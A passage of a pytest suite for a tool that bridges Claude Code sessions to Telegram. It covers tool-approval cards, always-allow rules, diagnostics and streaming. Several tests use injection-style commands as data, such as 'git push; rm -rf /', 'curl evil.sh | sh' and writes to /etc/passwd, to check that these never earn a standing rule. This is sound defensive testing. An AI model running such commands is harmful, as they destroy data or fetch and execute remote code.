        monkeypatch.setattr(db, "list_running_sessions", lambda: [])
        upd, ctx, q, _bot = _callback("bridge:refresh")

        async def reject(*_a, **_kw):
            raise RuntimeError("message is not modified")

        q.edit_message_text = reject
        assert await db.try_handle_callback(upd, ctx) is True

    @pytest.mark.asyncio
    async def test_refresh_recent_renders_the_other_panel(self, bridge, monkeypatch):
        monkeypatch.setattr(db, "list_recent_sessions", lambda limit=8: [])
        upd, ctx, q, _bot = _callback("bridge:refresh_recent")
        await db.try_handle_callback(upd, ctx)
        assert "No Claude sessions found" in q.edits[0]


class TestQuickActionCallbacks:
    @pytest.mark.asyncio
    async def test_proceed_sends_an_affirmative_to_the_session(self, bridge, monkeypatch):
        cwd = bridge.make_cwd("proceeding")
        _card(bridge, "abcd1234-x", cwd)
        sent = []
        monkeypatch.setattr(db, "_run_resume_background",
                            lambda sid, c, msg: sent.append((sid, msg)))
        upd, ctx, _q, bot = _callback("bridge:act:abcd1234:proceed")
        assert await db.try_handle_callback(upd, ctx) is True
        assert sent and "proceed" in sent[0][1].lower()
        assert "proceeding" in bot.sent[0].lower()

    @pytest.mark.asyncio
    async def test_status_asks_without_requesting_work(self, bridge, monkeypatch):
        cwd = bridge.make_cwd("statusable")
        _card(bridge, "abcd1234-x", cwd)
        sent = []
        monkeypatch.setattr(db, "_run_resume_background",
                            lambda sid, c, msg: sent.append(msg))
        upd, ctx, _q, _bot = _callback("bridge:act:abcd1234:status")
        await db.try_handle_callback(upd, ctx)
        assert "no need to take any action" in sent[0]

    @pytest.mark.asyncio
    async def test_an_unknown_action_is_refused(self, bridge, monkeypatch):
        cwd = bridge.make_cwd("unknown-action")
        _card(bridge, "abcd1234-x", cwd)
        called = []
        monkeypatch.setattr(db, "_run_resume_background",
                            lambda *a: called.append(a))
        upd, ctx, q, _bot = _callback("bridge:act:abcd1234:selfdestruct")
        assert await db.try_handle_callback(upd, ctx) is True
        assert called == []
        assert "Unknown action" in q.answers[0]

    @pytest.mark.asyncio
    async def test_a_malformed_action_payload_is_survivable(self, bridge):
        upd, ctx, q, _bot = _callback("bridge:act:nocolon")
        assert await db.try_handle_callback(upd, ctx) is True
        assert "Bad action" in q.answers[0]

    @pytest.mark.asyncio
    async def test_an_action_on_an_unknown_session_is_refused(self, bridge, monkeypatch):
        called = []
        monkeypatch.setattr(db, "_run_resume_background", lambda *a: called.append(a))
        upd, ctx, q, _bot = _callback("bridge:act:zzzzzzzz:proceed")
        await db.try_handle_callback(upd, ctx)
        assert called == []
        assert "not found" in q.answers[0].lower()


class TestApprovalCallbacks:
    def _pending(self, req_id: str = "req12345") -> str:
        conn = store._get_conn()
        conn.execute(
            "INSERT INTO bridge_approvals(request_id,session_id,cwd,tool,created_at)"
            " VALUES(?,?,?,?,?)",
            (req_id, "abcd1234-x", "/tmp/proj", "Bash", "2026-07-31T00:00:00"),
        )
        conn.commit()
        return req_id

    def _decision(self, req_id: str):
        return store._get_conn().execute(
            "SELECT decision FROM bridge_approvals WHERE request_id=?", (req_id,)
        ).fetchone()[0]

    @pytest.mark.asyncio
    async def test_approve_records_a_yes(self, bridge):
        req = self._pending()
        upd, ctx, q, _bot = _callback(f"bridge:appr:{req}:y")
        assert await db.try_handle_callback(upd, ctx) is True
        assert self._decision(req) == "y"
        assert "Approved" in q.answers[0]

    @pytest.mark.asyncio
    async def test_deny_records_a_no(self, bridge):
        req = self._pending("req99999")
        upd, ctx, q, _bot = _callback(f"bridge:appr:{req}:n")
        await db.try_handle_callback(upd, ctx)
        assert self._decision(req) == "n"
        assert "Denied" in q.answers[0]

    @pytest.mark.asyncio
    async def test_the_buttons_are_replaced_so_it_cannot_be_answered_twice(self, bridge):
        req = self._pending("reqtwice")
        upd, ctx, q, _bot = _callback(f"bridge:appr:{req}:y")
        await db.try_handle_callback(upd, ctx)
        assert q.markup_edits == 1

    @pytest.mark.asyncio
    async def test_a_malformed_approval_payload_is_survivable(self, bridge):
        upd, ctx, _q, _bot = _callback("bridge:appr:onlyoneparts")
        assert await db.try_handle_callback(upd, ctx) is True

    @pytest.mark.asyncio
    async def test_answering_an_unknown_request_changes_nothing(self, bridge):
        req = self._pending("reqreal")
        upd, ctx, _q, _bot = _callback("bridge:appr:reqfake:y")
        await db.try_handle_callback(upd, ctx)
        assert self._decision(req) is None


# ══════════════════════════════════════════════════════════════════════════════
# 11. One-tap approval
#
# Approve/Deny buttons existed, but the card showed a tool name and a file path
# — approving a Write on that basis is approving a change you cannot see. And
# because every call asked again, `git status` prompted forever, which is why
# approval mode got armed once and switched off. Two halves, tested here: show
# the actual call, and let one tap mean "yes, and stop asking".
# ══════════════════════════════════════════════════════════════════════════════


class TestToolCallPreview:
    def test_bash_shows_the_command_it_would_run(self):
        out = db.describe_tool_call("Bash", {"command": "rm -rf build && echo done"})
        assert "rm -rf build && echo done" in out

    def test_bash_carries_its_own_description(self):
        out = db.describe_tool_call("Bash", {"command": "ls", "description": "List files"})
        assert "List files" in out

    def test_an_edit_shows_the_diff_not_just_the_filename(self):
        """The load-bearing one: a path alone is not enough to decide on."""
        out = db.describe_tool_call("Edit", {
            "file_path": "/proj/auth.py",
            "old_string": "if token.expired:",
            "new_string": "if token.expired(now):",
        }, cwd="/proj")
        assert "auth.py" in out
        assert "- if token.expired:" in out
        assert "+ if token.expired(now):" in out

    def test_a_write_shows_its_size_and_the_start_of_the_content(self):
        out = db.describe_tool_call("Write", {
            "file_path": "/proj/new.py", "content": "line one\nline two\nline three",
        }, cwd="/proj")
        assert "3 lines" in out and "line one" in out

    def test_multiedit_counts_its_edits_and_previews_the_first(self):
        out = db.describe_tool_call("MultiEdit", {
            "file_path": "/proj/a.py",
            "edits": [{"old_string": "a", "new_string": "b"},
                      {"old_string": "c", "new_string": "d"}],
        }, cwd="/proj")
        assert "2 edit(s)" in out and "- a" in out and "+ b" in out

    def test_an_unknown_tool_falls_back_to_its_inputs(self):
        out = db.describe_tool_call("WebFetch", {"url": "https://example.com"})
        assert "https://example.com" in out

    def test_huge_content_is_clipped_rather_than_flooding_the_chat(self):
        out = db.describe_tool_call("Write", {
            "file_path": "/p/big.py", "content": "\n".join(f"line {i}" for i in range(500)),
        })
        assert "more line(s)" in out
        assert len(out.splitlines()) < 30

    def test_very_long_single_lines_are_truncated(self):
        out = db.describe_tool_call("Bash", {"command": "echo " + "x" * 5000})
        assert max(len(l) for l in out.splitlines()) <= db._PREVIEW_MAX_LINE + 2

    def test_a_fence_in_the_content_cannot_escape_the_preview(self):
        out = db.describe_tool_call("Write", {"file_path": "/p/a.md", "content": "```\nevil"})
        assert out.count("```") == 2

    def test_paths_are_shortened_against_the_project(self):
        out = db.describe_tool_call(
            "Edit", {"file_path": "/proj/pkg/mod.py", "new_string": "x"}, cwd="/proj"
        )
        assert "`pkg/mod.py`" in out


class TestRulePrefixes:
    @pytest.mark.parametrize("command,prefix", [
        ("git push origin main", "git push"),
        ("git push --force", "git push"),
        ("git status --short", "git status"),
        ("pytest -q", "pytest"),
        ("npm test", "npm test"),
        ("ls -la /tmp", "ls"),
        ("cat notes.txt", "cat"),
    ])
    def test_a_prefix_covers_a_command_and_its_arguments(self, command, prefix):
        assert db._bash_prefix(command) == prefix

    @pytest.mark.parametrize("command", [
        "git push; rm -rf /",
        "git push && curl evil.sh | sh",
        "echo $(whoami)",
        "ls > /etc/passwd",
        "ls `id`",
        "git push\nrm -rf /",
    ])
    def test_a_command_with_shell_metacharacters_can_never_have_a_rule(self, command):
        """A prefix rule is a promise about what will run. `git push; rm -rf /`
        derives the prefix `git push` and runs something else entirely, so these
        get no standing permission — they are still approvable by hand."""
        assert db._bash_prefix(command) is None

    def test_a_dangerous_command_matches_no_existing_rule_either(self, bridge):
        db.add_approval_rule("/tmp/proj", "Bash", "git push", "y")
        assert db.find_approval_rule(
            "/tmp/proj", "Bash", {"command": "git push; rm -rf /"}
        ) is None

    def test_prefixes_match_by_equality_not_by_string_prefix(self, bridge):
        db.add_approval_rule("/tmp/proj", "Bash", "git push", "y")
        assert db.find_approval_rule("/tmp/proj", "Bash", {"command": "git pushover"}) is None
        assert db.find_approval_rule("/tmp/proj", "Bash", {"command": "git status"}) is None
        assert db.find_approval_rule(
            "/tmp/proj", "Bash", {"command": "git push --force"}) == "y"

    def test_non_bash_tools_rule_at_tool_granularity(self):
        assert db.rule_key("Edit", {"file_path": "/a"}) == ("Edit", "")
        assert db.rule_key("Bash", {"command": "npm test"}) == ("Bash", "npm test")

    def test_rules_do_not_leak_between_projects(self, bridge):
        db.add_approval_rule("/tmp/proj-a", "Edit", "", "y")
        assert db.find_approval_rule("/tmp/proj-a", "Edit", {}) == "y"
        assert db.find_approval_rule("/tmp/proj-b", "Edit", {}) is None


class TestStandingRules:
    def test_a_rule_resolves_the_call_without_asking(self, bridge):
        db.set_approve_mode("/tmp/proj", True)
        db.add_approval_rule("/tmp/proj", "Bash", "git status", "y")
        result = db.hook_approve({
            "cwd": "/tmp/proj", "session_id": "abcd1234-x",
            "tool_name": "Bash", "tool_input": {"command": "git status --short"},
        })
        assert result["hookSpecificOutput"]["permissionDecision"] == "allow"
        # Silence is the whole point: being asked again is what the rule prevents.
        assert bridge.tg.sent == []

    def test_a_deny_rule_says_which_rule_denied_it(self, bridge):
        db.set_approve_mode("/tmp/proj", True)
        db.add_approval_rule("/tmp/proj", "Bash", "git push", "n")
        result = db.hook_approve({
            "cwd": "/tmp/proj", "session_id": "abcd1234-x",
            "tool_name": "Bash", "tool_input": {"command": "git push origin main"},
        })
        out = result["hookSpecificOutput"]
        assert out["permissionDecision"] == "deny"
        assert "git push" in out["permissionDecisionReason"]

    def test_an_auto_resolved_call_is_still_recorded(self, bridge):
        """A silent decision that leaves no trace is not auditable."""
        db.set_approve_mode("/tmp/proj", True)
        db.add_approval_rule("/tmp/proj", "Bash", "ls", "y")
        db.hook_approve({
            "cwd": "/tmp/proj", "session_id": "abcd1234-x",
            "tool_name": "Bash", "tool_input": {"command": "ls -la"},
        })
        rows = store._get_conn().execute(
            "SELECT tool, decision FROM bridge_approvals"
        ).fetchall()
        assert [tuple(r) for r in rows] == [("Bash", "y")]

    def test_the_card_offers_an_always_allow_button(self, bridge):
        db.set_approve_mode("/tmp/proj", True)
        TestApproveHook()._answer_when_asked("y")
        db.hook_approve({
            "cwd": "/tmp/proj", "session_id": "abcd1234-x",
            "tool_name": "Bash", "tool_input": {"command": "npm test"},
        })
        rule_buttons = [b for b in bridge.tg.buttons(0)
                        if b["callback_data"].startswith("bridge:rule:")]
        assert len(rule_buttons) == 1
        assert "npm test" in rule_buttons[0]["text"]

    def test_no_always_allow_button_for_an_unruleable_command(self, bridge):
        db.set_approve_mode("/tmp/proj", True)
        TestApproveHook()._answer_when_asked("n")
        db.hook_approve({
            "cwd": "/tmp/proj", "session_id": "abcd1234-x",
            "tool_name": "Bash", "tool_input": {"command": "git push; rm -rf /"},
        })
        assert not any(d.startswith("bridge:rule:") for d in bridge.tg.callback_data(0))
        # …but it is still decidable by hand.
        assert any(d.startswith("bridge:appr:") for d in bridge.tg.callback_data(0))


class TestRuleCallbacks:
    def _pending(self, req_id: str, tool: str = "Bash", prefix: str = "git push") -> str:
        db._record_approval(req_id, "abcd1234-x", "/tmp/proj", tool, prefix)
        return req_id

    @pytest.mark.asyncio
    async def test_one_tap_both_decides_and_writes_the_rule(self, bridge):
        self._pending("reqrule1")
        upd, ctx, q, _bot = _callback("bridge:rule:reqrule1:y")
        assert await db.try_handle_callback(upd, ctx) is True
        assert store._get_conn().execute(
            "SELECT decision FROM bridge_approvals WHERE request_id='reqrule1'"
        ).fetchone()[0] == "y"
        assert db.find_approval_rule(
            "/tmp/proj", "Bash", {"command": "git push origin main"}) == "y"
        assert "always" in q.answers[0].lower()

    @pytest.mark.asyncio
    async def test_a_rule_tap_on_an_unknown_request_still_decides_nothing_odd(self, bridge):
        upd, ctx, _q, _bot = _callback("bridge:rule:nosuchreq:y")
        assert await db.try_handle_callback(upd, ctx) is True
        assert db.list_approval_rules() == []

    @pytest.mark.asyncio
    async def test_a_tool_wide_rule_is_written_with_an_empty_prefix(self, bridge):
        self._pending("reqrule2", tool="Edit", prefix="")
        upd, ctx, _q, _bot = _callback("bridge:rule:reqrule2:y")
        await db.try_handle_callback(upd, ctx)
        assert db.find_approval_rule("/tmp/proj", "Edit", {"file_path": "/x"}) == "y"

    @pytest.mark.asyncio
    async def test_a_rule_can_be_revoked_from_the_panel(self, bridge):
        db.add_approval_rule("/tmp/proj", "Bash", "git push", "y")
        rule_id = db.list_approval_rules()[0][0]
        upd, ctx, q, _bot = _callback(f"bridge:rulerm:{rule_id}")
        assert await db.try_handle_callback(upd, ctx) is True
        assert db.list_approval_rules() == []
        assert q.edits            # the panel is redrawn without it

    @pytest.mark.asyncio
    async def test_revoking_a_gone_rule_answers_rather_than_failing(self, bridge):
        upd, ctx, q, _bot = _callback("bridge:rulerm:9999")
        assert await db.try_handle_callback(upd, ctx) is True
        assert q.answers

    @pytest.mark.asyncio
    async def test_a_malformed_revoke_payload_is_survivable(self, bridge):
        upd, ctx, _q, _bot = _callback("bridge:rulerm:not-a-number")
        assert await db.try_handle_callback(upd, ctx) is True


class TestApprovalsCommand:
    @pytest.mark.asyncio
    async def test_it_lists_rules_with_their_project(self, bridge):
        db.add_approval_rule("/tmp/myproject", "Bash", "git push", "y")
        upd = _update("/approvals")
        await db.cmd_approvals(upd, _ctx())
        text = upd.message.replies[0]
        assert "git push" in text and "myproject" in text

    @pytest.mark.asyncio
    async def test_an_empty_list_says_how_to_add_one(self, bridge):
        upd = _update("/approvals")
        await db.cmd_approvals(upd, _ctx())
        assert "Always allow" in upd.message.replies[0]

    @pytest.mark.asyncio
    async def test_clear_removes_every_rule(self, bridge):
        db.add_approval_rule("/tmp/a", "Bash", "git push", "y")
        db.add_approval_rule("/tmp/b", "Edit", "", "y")
        upd = _update("/approvals clear")
        await db.cmd_approvals(upd, _ctx("clear"))
        assert db.list_approval_rules() == []
        assert "2" in upd.message.replies[0]


class TestApprovalSchemaMigration:
    def test_an_existing_install_gains_the_rule_prefix_column(self, tmp_path):
        """bridge_approvals predates rules and every CREATE is IF NOT EXISTS, so
        an upgrade has to ALTER — otherwise the always-allow button writes a
        rule with no prefix to write it from."""
        conn = sqlite3.connect(tmp_path / "old.db")
        conn.executescript(
            "CREATE TABLE bridge_approvals ("
            " request_id TEXT PRIMARY KEY, session_id TEXT, cwd TEXT, tool TEXT,"
            " decision TEXT, created_at TEXT NOT NULL, decided_at TEXT);"
        )
        conn.execute(
            "INSERT INTO bridge_approvals(request_id,tool,created_at)"
            " VALUES('old1','Bash','2026-01-01')"
        )
        conn.commit()
        db.init_bridge_schema(conn)
        conn.commit()
        cols = {r[1] for r in conn.execute("PRAGMA table_info(bridge_approvals)")}
        assert "rule_prefix" in cols
        # and the row that was already there survives
        assert conn.execute("SELECT COUNT(*) FROM bridge_approvals").fetchone()[0] == 1
        conn.close()

    def test_running_the_schema_twice_is_harmless(self, tmp_path):
        conn = sqlite3.connect(tmp_path / "twice.db")
        db.init_bridge_schema(conn)
        db.init_bridge_schema(conn)
        conn.commit()
        cols = {r[1] for r in conn.execute("PRAGMA table_info(bridge_approvals)")}
        assert "rule_prefix" in cols
        conn.close()


# ══════════════════════════════════════════════════════════════════════════════
# Setup diagnostics
#
# "Did the install work?" and "why is nothing arriving?" are the same question,
# and neither the installer's one-shot warnings nor a list of running sessions
# could answer it. bridge_checks() is the single source both the installer and
# `telechat bridge status` render, so they can never drift apart.
# ══════════════════════════════════════════════════════════════════════════════


@pytest.fixture
def wired(bridge, monkeypatch, tmp_path):
    """A fully-wired bridge: hooks registered, credentials present, service up."""
    settings = tmp_path / "settings.json"
    settings.write_text(json.dumps({"hooks": {
        event: [{"hooks": [{"type": "command", "command": f"telechat bridge notify {event}"}]}]
        for event in db.NOTIFY_EVENTS
    }}))
    monkeypatch.setattr(db, "CLAUDE_SETTINGS", settings)
    monkeypatch.setattr(db, "_load_env_file", lambda: {
        "TELEGRAM_BOT_TOKEN": "t", "TELEGRAM_CHAT_ID": "1",
        "CLAUDE_CODE_OAUTH_TOKEN": "sk-ant-oat01-x",
    })
    monkeypatch.setattr(db.shutil, "which", lambda name: "/usr/local/bin/claude")
    monkeypatch.setattr(db, "_service_loaded", lambda: True)
    return settings


def _check(checks, name):
    return next(c for c in checks if c["name"] == name)


class TestBridgeChecks:
    def test_a_fully_wired_bridge_reports_no_blocking_problems(self, wired):
        checks = db.bridge_checks()
        assert [c for c in checks if c["blocking"] and not c["ok"]] == []
        assert db._preflight() == []

    def test_missing_hooks_are_a_blocking_failure(self, wired, monkeypatch):
        # Claude Code normalises settings.json and has stripped our entries
        # before. Nothing else in the chain notices, and no cards ever arrive.
        wired.write_text(json.dumps({"hooks": {}}))
        hooks = _check(db.bridge_checks(), "Hooks registered")
        assert not hooks["ok"] and hooks["blocking"]
        assert "none" in hooks["detail"]
        assert "telechat bridge install" in hooks["fix"]

    def test_partly_registered_hooks_still_count_as_broken(self, wired):
        wired.write_text(json.dumps({"hooks": {
            "Stop": [{"hooks": [{"type": "command", "command": "telechat bridge notify Stop"}]}],
        }}))
        hooks = _check(db.bridge_checks(), "Hooks registered")
        assert not hooks["ok"]
        assert "Stop" in hooks["detail"]

    def test_a_foreign_hook_does_not_count_as_ours(self, wired):
        wired.write_text(json.dumps({"hooks": {
            e: [{"hooks": [{"type": "command", "command": "some-other-tool --go"}]}]
            for e in db.NOTIFY_EVENTS
        }}))
        assert not _check(db.bridge_checks(), "Hooks registered")["ok"]

    def test_a_missing_oauth_token_is_blocking(self, wired, monkeypatch):
        # Cards arrive without it; every reply 401s. That asymmetry is exactly
        # why it has to be called out rather than inferred from "cards work".
        monkeypatch.setattr(db, "_load_env_file", lambda: {
            "TELEGRAM_BOT_TOKEN": "t", "TELEGRAM_CHAT_ID": "1",
        })
        token = _check(db.bridge_checks(), "Long-lived OAuth token")
        assert not token["ok"] and token["blocking"]
        assert "401" in token["detail"]
        assert any("Long-lived OAuth token" in w for w in db._preflight())

    def test_either_telegram_recipient_setting_satisfies_the_check(self, wired, monkeypatch):
        for key in ("TELEGRAM_CHAT_ID", "TELEGRAM_ALLOWED_USER_IDS"):
            monkeypatch.setattr(db, "_load_env_file", lambda k=key: {
                "TELEGRAM_BOT_TOKEN": "t", k: "1", "CLAUDE_CODE_OAUTH_TOKEN": "x",
            })
            assert _check(db.bridge_checks(), "Telegram recipient")["ok"], key

    def test_a_stopped_service_is_reported_but_not_blocking(self, wired, monkeypatch):
        # Cards are posted by the hook subprocess itself, so they still arrive.
        # Only replies need the poller — calling this blocking would send people
        # chasing a service when their actual problem was elsewhere.
        monkeypatch.setattr(db, "_service_loaded", lambda: False)
        svc = _check(db.bridge_checks(), "Background service")
        assert not svc["ok"] and not svc["blocking"]
        assert db._preflight() == []

    def test_a_platform_without_launchd_is_not_a_failure(self, wired, monkeypatch):
        monkeypatch.setattr(db, "_service_loaded", lambda: None)
        svc = _check(db.bridge_checks(), "Background service")
        assert svc["ok"]
        assert "systemd" in svc["detail"]

    def test_the_approval_hook_reports_both_states_without_failing(self, wired):
        assert "not registered" in _check(db.bridge_checks(), "Tool approval hook")["detail"]
        wired.write_text(json.dumps({"hooks": {
            **{e: [{"hooks": [{"type": "command", "command": f"telechat bridge notify {e}"}]}]
               for e in db.NOTIFY_EVENTS},
            "PreToolUse": [{"matcher": "Bash",
                            "hooks": [{"type": "command", "command": "telechat bridge approve"}]}],
        }}))
        armed = _check(db.bridge_checks(), "Tool approval hook")
        assert armed["ok"] and "registered" in armed["detail"]
        assert db._preflight() == []

    def test_an_unreadable_settings_file_reads_as_no_hooks(self, wired):
        wired.write_text("{ not json")
        assert not _check(db.bridge_checks(), "Hooks registered")["ok"]


class TestBridgeStatusCommand:
    def test_a_wired_bridge_exits_zero(self, wired, monkeypatch, capsys):
        monkeypatch.setattr(db, "list_running_sessions", lambda: [])
        assert db.cli_dispatch(["status"]) == 0
        out = capsys.readouterr().out
        assert "Wired up" in out
        assert "Hooks registered" in out

    def test_a_broken_bridge_exits_non_zero_and_says_why(self, wired, monkeypatch, capsys):
        # The point of a status command is being usable as a check, not just
        # readable — a script has to be able to tell.
        wired.write_text(json.dumps({"hooks": {}}))
        monkeypatch.setattr(db, "list_running_sessions", lambda: [])
        assert db.cli_dispatch(["status"]) == 1
        out = capsys.readouterr().out
        assert "Not ready" in out
        assert "Fix: telechat bridge install" in out

    def test_it_still_lists_sessions(self, wired, monkeypatch, capsys):
        monkeypatch.setattr(db, "list_running_sessions", lambda: [
            {"sid": "abcdef0123", "cwd": "/x/telechat", "model": "opus",
             "etime": "01:02", "pid": "7"},
        ])
        db.cli_dispatch(["status"])
        out = capsys.readouterr().out
        assert "abcdef01" in out and "telechat" in out

    def test_a_session_with_no_id_does_not_break_the_listing(self, wired, monkeypatch, capsys):
        monkeypatch.setattr(db, "list_running_sessions", lambda: [
            {"sid": "", "cwd": "", "model": "", "etime": "00:01", "pid": "9"},
        ])
        db.cli_dispatch(["status"])
        assert "(new)" in capsys.readouterr().out


class TestInstallEpilogue:
    def _install(self, monkeypatch, capsys, warnings):
        monkeypatch.setattr(db, "_settings_load", lambda: {})
        monkeypatch.setattr(db, "_settings_save", lambda data: None)
        monkeypatch.setattr(db, "_migrate_standalone", lambda: None)
        monkeypatch.setattr(db, "_preflight", lambda: warnings)
        assert db.cli_install(with_service=False) == 0
        return capsys.readouterr().out

    def test_a_ready_install_says_what_to_do_next(self, bridge, monkeypatch, capsys):
        out = self._install(monkeypatch, capsys, [])
        assert "telechat bridge status" in out
        assert "--approval" in out

    def test_an_incomplete_install_does_not_claim_success(self, bridge, monkeypatch, capsys):
        # It used to print the hooks it wrote and stop, so a missing OAuth token
        # read as "installed" right up until the first reply 401'd.
        out = self._install(monkeypatch, capsys, ["Long-lived OAuth token: missing"])
        assert "not working yet" in out
        assert "Long-lived OAuth token" in out
        assert "telechat bridge status" in out


# ══════════════════════════════════════════════════════════════════════════════
# 9. Live turn streaming
# ══════════════════════════════════════════════════════════════════════════════


def _assistant_event(text: str = "", tools: list[tuple[str, dict]] | None = None) -> dict:
    content = []
    if text:
        content.append({"type": "text", "text": text})
    for name, inp in tools or []:
        content.append({"type": "tool_use", "name": name, "input": inp})
    return {"type": "assistant", "message": {"content": content}}


class TestStreamTrace:
    """The card renderer, fed fixture events rather than a real subprocess."""

    def test_a_tool_call_becomes_a_trace_line(self):
        trace = db._StreamTrace("sid-stream")
        assert trace.feed(_assistant_event(tools=[("Bash", {"command": "pytest -q"})]))
        assert trace.steps == 1
        assert "🔧 Bash" in trace.lines[0]
        assert "pytest -q" in trace.lines[0]

    def test_a_tool_without_a_recognised_detail_still_renders(self):
        trace = db._StreamTrace("sid-stream")
        trace.feed(_assistant_event(tools=[("WebSearch", {"query": "unmapped"})]))
        assert trace.lines == ["🔧 WebSearch"]

    def test_assistant_prose_replaces_rather_than_accumulates(self):
        trace = db._StreamTrace("sid-stream")
        trace.feed(_assistant_event(text="first thought"))
        trace.feed(_assistant_event(text="second thought"))
        assert trace.text == "second thought"

    def test_events_that_change_nothing_report_no_change(self):
        # The edit throttle keys off this: a stream of user/system events must
        # not each buy a Telegram round-trip.
        trace = db._StreamTrace("sid-stream")
        assert trace.feed({"type": "user", "message": {"content": []}}) is False
        assert trace.feed(_assistant_event(text="   ")) is False

    def test_the_trace_is_capped_but_the_step_count_is_not(self):
        # Telegram caps a message at 4096 chars; a long turn emits hundreds of
        # calls. The count has to survive the trimming, or the card understates
        # what the session did.
        trace = db._StreamTrace("sid-stream")
        for i in range(db._STREAM_MAX_TRACE + 5):
            trace.feed(_assistant_event(tools=[("Read", {"file_path": f"f{i}.py"})]))
        assert trace.steps == db._STREAM_MAX_TRACE + 5
        assert len(trace.lines) == db._STREAM_MAX_TRACE
        assert "f16.py" in trace.lines[-1]        # newest kept
        assert not any("f0.py" in ln for ln in trace.lines)   # oldest dropped

    def test_the_card_says_how_many_steps_it_is_hiding(self):
        trace = db._StreamTrace("sid-stream")
        for i in range(db._STREAM_MAX_TRACE + 3):
            trace.feed(_assistant_event(tools=[("Read", {"file_path": f"f{i}.py"})]))
        assert "…3 earlier step(s)" in trace.render("H", "⏳")

    def test_long_prose_is_tailed_with_an_ellipsis(self):
        trace = db._StreamTrace("sid-stream")
        trace.feed(_assistant_event(text="x" * (db._STREAM_TEXT_TAIL + 200)))
        card = trace.render("H", "⏳")
        assert "…" in card
        assert len(card) < db._STREAM_TEXT_TAIL + 400

    def test_a_result_event_ends_the_trace_successfully(self):
        trace = db._StreamTrace("sid-stream")
        trace.feed({"type": "result", "subtype": "success", "result": "all done"})
        assert trace.result == "all done"
        assert trace.is_error is False

    def test_an_error_result_is_recorded_as_one(self):
        trace = db._StreamTrace("sid-stream")
        trace.feed({"type": "result", "subtype": "error_during_execution",
                    "is_error": True, "result": "boom"})
        assert trace.is_error is True

    def test_a_result_subtype_other_than_success_counts_as_an_error(self):
        # `is_error` is not always set; the subtype is the reliable signal for
        # things like max-turns exhaustion.
        trace = db._StreamTrace("sid-stream")
        trace.feed({"type": "result", "subtype": "error_max_turns", "result": ""})
        assert trace.is_error is True


class TestStreamResume:
    """The subprocess path, driven by the fake claude binary."""

    def _stream_claude(self, bridge, events: list[dict], exit_code: int = 0):
        bridge.set_claude_output(
            stdout="\n".join(json.dumps(e) for e in events), exit_code=exit_code)

    def _env(self):
        return dict(os.environ)

    def test_a_streamed_turn_returns_the_result_text(self, bridge, tmp_path):
        self._stream_claude(bridge, [
            _assistant_event(tools=[("Bash", {"command": "ls"})]),
            {"type": "result", "subtype": "success", "result": "the answer"},
        ])
        out = db._stream_resume("sid-stream", str(tmp_path), "hi", self._env())
        assert out == "the answer"

    def test_it_asks_the_cli_for_a_json_stream(self, bridge, tmp_path):
        self._stream_claude(bridge, [{"type": "result", "result": "ok"}])
        db._stream_resume("sid-stream", str(tmp_path), "hi", self._env())
        argv = bridge.invocations[0]
        assert "--output-format stream-json" in argv
        assert "--verbose" in argv

    def test_the_card_is_edited_in_place_rather_than_reposted(self, bridge, tmp_path):
        self._stream_claude(bridge, [
            _assistant_event(tools=[("Bash", {"command": "ls"})]),
            {"type": "result", "subtype": "success", "result": "done"},
        ])
        db._stream_resume("sid-stream", str(tmp_path), "hi", self._env())
        methods = [m for m, _ in bridge.tg.calls]
        assert methods.count("sendMessage") == 1
        assert "editMessageText" in methods

    def test_the_final_card_reports_the_step_count(self, bridge, tmp_path):
        self._stream_claude(bridge, [
            _assistant_event(tools=[("Bash", {"command": "ls"})]),
            _assistant_event(tools=[("Read", {"file_path": "a.py"})]),
            {"type": "result", "subtype": "success", "result": "done"},
        ])
        db._stream_resume("sid-stream", str(tmp_path), "hi", self._env())
        last = [p for m, p in bridge.tg.calls if m == "editMessageText"][-1]
        assert "✅ done · 2 step(s)" in last["text"]

    def test_a_failed_turn_says_so_on_the_card(self, bridge, tmp_path):
        self._stream_claude(bridge, [
            {"type": "result", "subtype": "error_during_execution", "is_error": True,
             "result": "it broke"},
        ])
        db._stream_resume("sid-stream", str(tmp_path), "hi", self._env())
        last = [p for m, p in bridge.tg.calls if m == "editMessageText"][-1]
        assert "❌" in last["text"]

    def test_garbage_lines_are_skipped_rather_than_fatal(self, bridge, tmp_path):
        # The CLI interleaves the odd non-JSON line (warnings, node noise).
        bridge.set_claude_output(stdout="not json\n" + json.dumps(
            {"type": "result", "subtype": "success", "result": "survived"}))
        assert db._stream_resume("sid-stream", str(tmp_path), "hi", self._env()) == "survived"

    def test_an_old_cli_falls_back_instead_of_inventing_output(self, bridge, tmp_path):
        # A CLI that doesn't know `stream-json` prints nothing parseable. That
        # has to return None so the caller re-runs on the blocking path — the
        # turn never started, so re-running is safe here.
        bridge.set_claude_output(stdout="error: unknown option --output-format stream-json",
                                 exit_code=1)
        assert db._stream_resume("sid-stream", str(tmp_path), "hi", self._env()) is None

    def test_the_dead_progress_card_is_removed_on_fallback(self, bridge, tmp_path):
        bridge.set_claude_output(stdout="nope", exit_code=1)
        db._stream_resume("sid-stream", str(tmp_path), "hi", self._env())
        assert "deleteMessage" in [m for m, _ in bridge.tg.calls]

    def test_a_telegram_that_cannot_send_falls_back(self, bridge, tmp_path):
        self._stream_claude(bridge, [{"type": "result", "result": "ok"}])
        bridge.tg.fail_all = True
        assert db._stream_resume("sid-stream", str(tmp_path), "hi", self._env()) is None

    def test_a_turn_that_already_ran_is_never_handed_back_for_a_rerun(self, bridge, tmp_path, monkeypatch):
        # The regression this guards: a failure *after* events arrived used to
        # return None, and the caller then re-ran `claude --resume` from the
        # top — replaying every edit and command the turn had already done.
        self._stream_claude(bridge, [
            _assistant_event(text="I pushed the commit", tools=[("Bash", {"command": "git push"})]),
            {"type": "result", "subtype": "success", "result": "pushed"},
        ])

        def explode(*a, **k):
            raise RuntimeError("telegram fell over mid-stream")

        monkeypatch.setattr(db, "_tg_edit", explode)
        out = db._stream_resume("sid-stream", str(tmp_path), "hi", self._env())
        assert out is not None
        assert "I pushed the commit" in out

    def test_a_stream_with_prose_but_no_result_still_returns_it(self, bridge, tmp_path):
        self._stream_claude(bridge, [_assistant_event(text="partial thought")])
        assert db._stream_resume("sid-stream", str(tmp_path), "hi", self._env()) == "partial thought"


class TestStreamConfig:
    def test_streaming_is_on_by_default(self, monkeypatch):
        monkeypatch.delenv("BRIDGE_STREAM", raising=False)
        assert db._stream_enabled() is True

    @pytest.mark.parametrize("value", ["0", "false", "no", "off", "OFF"])
    def test_it_can_be_switched_off(self, monkeypatch, value):
        monkeypatch.setenv("BRIDGE_STREAM", value)
        assert db._stream_enabled() is False

    def test_the_edit_interval_is_configurable(self, monkeypatch):
